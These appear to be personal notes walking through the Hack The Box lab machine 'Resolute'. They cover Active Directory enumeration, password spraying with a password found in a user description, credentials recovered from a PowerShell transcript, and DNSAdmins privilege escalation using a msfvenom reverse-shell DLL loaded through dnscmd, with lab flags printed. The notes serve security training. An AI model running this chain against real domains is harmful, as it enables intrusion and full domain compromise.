'''
10.129.96.155 - Resolute
'''

## Ports Open:
> Refer to `allports.nmap`

## Exploitation:
> Found no shares
> `ldapsearch` shows domain as `megabank.local`
> Used `ldapsearch` to get more info
```bash
ldapsearch -h 10.129.96.155 -x -b "DC=megabank,DC=local"
``` 
> Also queried users using `ldapsearch` to corelate
> `nslookup` gives nothing
> Cant do zone transfers
> `rpcclient` works
> Found users
> Found interesting group `contractors` and it has one member `ryan`
> AS-REP Roasting gives nothing
> Found the domain as `MEGABANK`
> Found user `marko` having password in description
	marko:Welcome123!
```bash
querydispinfo
```
> Did password spraying on all accounts with this password
> Password works for user `melanie`
> Got shell using `evil-winrm`
> Found `user.txt`
	d7b0b400ee744271e298c5e06ae264fe
> Used `Seatbelt.exe` and found `C:\PSTranscripts`
> Found it using this too
```powershell
gci -Hidden
```
> Found a powershell transcript
> Found password for `ryan` in it
	ryan:Serv3r4Admin4cc123!
> Found a `note.txt` in `ryan` user's desktop
```
Email to team:
- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```
> We know `ryan` is a part of `DNSAdmins` group
> We can use it for privilege escalation
> Made a malicious DLL using `msfvenom`
```bash
msfvenom -a x64 -p -p windows/x64/shell_reverse_tcp LHOST=10.10.15.75 LPORT=4444 -f dll > privesc.dll
```
> Started a SMB server
```bash
smbserver.py share .
```
> Used these commands to get a shell
```bash
# ON WINDOWS
dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.15.75\share\privesc.dll
sc.exe stop dns
sc.exe start dns

# ON LINUX
nc -lvnp 4444
```
> GOT ROOT!!!
	101f63a3e2b46e2de524395a47186082